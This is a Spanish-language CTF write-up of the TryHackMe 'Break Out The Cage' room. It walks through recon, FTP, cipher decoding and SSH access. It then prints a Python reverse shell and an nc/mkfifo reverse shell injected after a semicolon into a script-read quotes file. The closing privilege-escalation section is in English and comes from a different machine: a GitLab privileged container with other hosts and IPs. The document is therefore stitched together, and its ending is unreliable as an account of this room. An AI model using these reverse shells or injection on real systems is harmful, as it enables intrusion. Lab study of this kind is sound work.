---
layout: single
title: Break Out The Cage - TryHackMe
excerpt: "Let's find out what his agent is up to...."
date: 2022-04-18
classes: wide
header:
  teaser: /assets/images/htb-writeup-ready/ready_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - TryHackMe
  - infosec
tags:
  - python
  - steg
  - rot13

---


![](/assets/images/thm-writeup-break-out-the-cage/cage_logo.png)

 [Link](https://tryhackme.com/room/breakoutthecage1 "Break Out The Cage.1")

Help Cage bring back his acting career and investigate the nefarious goings on of his agent!

## 1. Fase de reconocimiento

- Para  conocer a que nos estamos enfrentando lanzamos el siguiente comando:

```
└─# ping -c 1 10.10.155.102
PING 10.10.155.102 (10.10.155.102) 56(84) bytes of data.
64 bytes from 10.10.155.102: icmp_seq=1 ttl=63 time=196 ms

--- 10.10.155.102 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 195.728/195.728/195.728/0.000 ms

```
- De acuerdo con el ttl=63, sabemos que nos estamos enfrentando ante una máquina con sistema operativo linux.

- Whatweb, nos muestra la siguiente información:
  
  ```
  └─# whatweb 10.10.155.102       http://10.10.155.102 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.155.102], Title[Nicholas Cage Stories]
  ```
---

- Página web: observamos la siguiente página:

![](/assets/images/thm-writeup-break-out-the-cage/cage_page.png)


---

## 2. Enumeración / Escaneo

- Escaneo de los 65536 puertos de red con nmap:
  
```
─# nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.155.102
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-18 20:30 -05
Initiating SYN Stealth Scan at 20:30
Scanning 10.10.155.102 [65535 ports]
Discovered open port 22/tcp on 10.10.155.102
Discovered open port 21/tcp on 10.10.155.102
Discovered open port 80/tcp on 10.10.155.102
Completed SYN Stealth Scan at 20:30, 13.83s elapsed (65535 total ports)
Nmap scan report for 10.10.155.102
Host is up, received user-set (0.16s latency).
Scanned at 2022-04-18 20:30:08 -05 for 13s
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.92 seconds
           Raw packets sent: 68140 (2.998MB) | Rcvd: 67949 (2.718MB)
```

- El anterior escaneo evidencia los siguientes puertos abiertos:

| Puerto  | Descripción |
| ---     | ---         |
| 21      | ftp         |
| 22      | ssh         |
| 80      | http        |

- Escaneo en busca de vulnerabilidades sobre los puertos abiertos:

```
└─# sudo nmap -T4 -sC -sV -oA scan -p- 10.10.155.102
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-18 20:48 -05
Nmap scan report for 10.10.155.102 (10.10.155.102)
Host is up (0.16s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.1.216
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dd:fd:88:94:f8:c8:d1:1b:51:e3:7d:f8:1d:dd:82:3e (RSA)
|   256 3e:ba:38:63:2b:8d:1c:68:13:d5:05:ba:7a:ae:d9:3b (ECDSA)
|_  256 c0:a6:a3:64:44:1e:cf:47:5f:85:f6:1f:78:4c:59:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Nicholas Cage Stories
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 160.00 seconds
```

### 2.3 WFUZZ

- Procedemos a realizar escaneo de los directorios:
  
```
└─# wfuzz --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 10.10.155.102/FUZZ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.155.102/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                
=====================================================================                        
000000002:   200        62 L     251 W      2453 Ch     "#"                                    
000000004:   200        62 L     251 W      2453 Ch     "#"                                    
000000014:   200        62 L     251 W      2453 Ch     "http://10.10.155.102/"                
000000016:   301        9 L      28 W       315 Ch      "images"                               
000000092:   301        9 L      28 W       313 Ch      "html"                                 
000000274:   301        9 L      28 W       316 Ch      "scripts"                              
000003674:   301        9 L      28 W       318 Ch      "contracts"                            
000045240:   200        62 L     251 W      2453 Ch     "http://10.10.155.102/"                
000060582:   301        9 L      28 W       318 Ch      "auditions"                            
000095524:   403        9 L      28 W       278 Ch      "server-status" 
```
- Se encuentran las siguientes páginas:

***html***

![](/assets/images/thm-writeup-break-out-the-cage/cage_html.png)

***scripts***

![](/assets/images/thm-writeup-break-out-the-cage/cage_scripts.png)

***contracts***

![](/assets/images/thm-writeup-break-out-the-cage/cage_contracts.png)

***auditions***

![](/assets/images/thm-writeup-break-out-the-cage/cage_auditions.png)


### 2.2 FTP

- Ingresamos al servidor **ftp**, en el cual encontramos un docuemto llamado **dad_tasks**, el cual procedemos a descargar, como se observa a continuación:

```
└─# ftp anonymous@10.10.155.102 
Connected to 10.10.155.102.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||29536|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
226 Directory send OK.
ftp> ls -la
229 Entering Extended Passive Mode (|||63995|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 May 25  2020 .
drwxr-xr-x    2 0        0            4096 May 25  2020 ..
-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
226 Directory send OK.
ftp> get dad_tasks
local: dad_tasks remote: dad_tasks
229 Entering Extended Passive Mode (|||42860|)
150 Opening BINARY mode data connection for dad_tasks (396 bytes).
100% |***********************************************************|   396      166.76 KiB/s    00:00 ETA
226 Transfer complete.
396 bytes received in 00:00 (2.39 KiB/s)
ftp> 
```
- Procedemo a revisar el contenido del documento descargado y nos encontramos con un código cifrado:
  
![](/assets/images/thm-writeup-break-out-the-cage/cage_ftp1.png)

 
- Procedemos a decoficar el código en base 64:
  
![](/assets/images/thm-writeup-break-out-the-cage/cage_64.png)


- Al analizar el resultado, se evidencia que está cifrado, procedemos a identificar el tipo de cifrado desde la siguiente url: https://www.boxentriq.com/code-breaking/cipher-identifier, la que nos entrega el siguiente resultado: Your ciphertext is likely of this type:
***Vigenere Cipher***

- Procedemos a tratar de descifrarlo desde: https://gchq.github.io/CyberChef/ pero nos pide una ***key***.

- Desde la páfina auditions, encontramos un archivo en mp3 llamado: must_practice_corrupt_file.mp3, que a los pocos segundos de escucharlo suena una interferencia estridente, al descargarlo y al analizarlo desde audicity, desde la opción: "Espectograma" se observa la siguiente frase:

![](/assets/images/thm-writeup-break-out-the-cage/cage_mp3.png)


- Con la frase encontrado en el punto anterior procedemos a descifrar el texto codificado en ***vigenère***, como se ve a continuación:
  
![](/assets/images/thm-writeup-break-out-the-cage/cage_vigenere.png)

- Con el paso anterior podemos responder la siguieten pregunta: ***What is Weston's password?***

### 2.3 SSH 

- Con la contraseña encontrada encontrada en el punto anterior procedemos a conectarnos vía ***SSH***:_

```
└─# ssh weston@10.10.155.102                        
The authenticity of host '10.10.155.102 (10.10.155.102)' can't be established.
ED25519 key fingerprint is SHA256:o7pzAxWHDEV8n+uNpDnQ+sjkkBvKP3UVlNw2MpzspBw.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.155.102' (ED25519) to the list of known hosts.
weston@10.10.155.102's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Apr 19 03:34:54 UTC 2022

  System load:  0.0                Processes:           91
  Usage of /:   20.4% of 19.56GB   Users logged in:     0
  Memory usage: 20%                IP address for eth0: 10.10.155.102
  Swap usage:   0%


39 packages can be updated.
0 updates are security updates.


         __________
        /\____;;___\
       | /         /
       `. ())oo() .
        |\(%()*^^()^\
       %| |-%-------|
      % \ | %  ))   |
      %  \|%________|
       %%%%
Last login: Tue May 26 10:58:20 2020 from 192.168.247.1
                                                                               
Broadcast message from cage@national-treasure (somewhere) (Tue Apr 19 03:36:01 
                                                                               
I mean it, honey, the world is being Fed-exed to hell in a hand cart. — The Rock
                                                                               
```

## Explotacion

- Ejecutamos ***linpeas*** y encontramo los siguientes archivos que pueden ser modificados

 ![](/assets/images/thm-writeup-break-out-the-cage/cage_vigenere.png)

/opt/.dads_scripts/.files
/opt/.dads_scripts/.files/.quotes


python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

weston@national-treasure:/opt/.dads_scripts/.files$ echo "Test; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.1.216 4444 >/tmp/f" > .quotes


## Bandera de usuario

- Ganamos acceso como usuario Cage y en el archivo ***Super_Duper_Checklist*** encontramos la bandera:
  
```
cage@national-treasure:~$ cd Super_Duper_Checklist
cd Super_Duper_Checklist
bash: cd: Super_Duper_Checklist: Not a directory
cage@national-treasure:~$ cat Super_Duper_Checklist
cat Super_Duper_Checklist
1 - Increase acting lesson budget by at least 30%
2 - Get Weston to stop wearing eye-liner
3 - Get a new pet octopus
4 - Try and keep current wife
5 - Figure out why Weston has this etched into his desk: THM{???????????}
```










## Privesc

By running [linpeas.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) we find a backup file with some SMTP credentials for the gitlab application. 

```
Found /opt/backup/gitlab.rb
gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
```

That password is the same password as the root password for the container so we can privesc locally inside the container.

```
git@gitlab:/opt/backup$ su -l root
su -l root
Password: wW59U!ZKMbG9+*#h

root@gitlab:~# 
```

There's a root_pass file in the root of the filesystem but that's not useful.

```
cat /root_pass
YG65407Bjqvv9A0a8Tm_7w
```

If we look at the `/opt/backup/docker-compose.yml` configuration file, we can see it's a hint that we're running in a privileged container:

```
    volumes:
      - './srv/gitlab/config:/etc/gitlab'
      - './srv/gitlab/logs:/var/log/gitlab'
      - './srv/gitlab/data:/var/opt/gitlab'
      - './root_pass:/root_pass'
    privileged: true
    restart: unless-stopped
    #mem_limit: 1024m
```

Privileged containers can access the host's disk devices so we can just read the root flag after mounting the drive.

![](/assets/images/htb-writeup-ready/root.png)

To get a proper shell in the host OS we can drop our SSH keys in the root's .ssh directory.

```
root@gitlab:~# mount /dev/sda2 /mnt
mount /dev/sda2 /mnt
root@gitlab:~# echo 'ssh-rsa AAAAB3NzaC1y[...]+HUBS+l32faXPc= snowscan@kali' > /mnt/root/.ssh/authorized_keys

[...]

$ ssh root@10.129.150.37
The authenticity of host '10.129.150.37 (10.129.150.37)' can't be established.
ECDSA key fingerprint is SHA256:7+5qUqmyILv7QKrQXPArj5uYqJwwe7mpUbzD/7cl44E.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.150.37' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)

[...]

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Feb 11 14:28:18 2021
root@ready:~# cat root.txt
b7f98681505cd39066f67147b103c2b3
```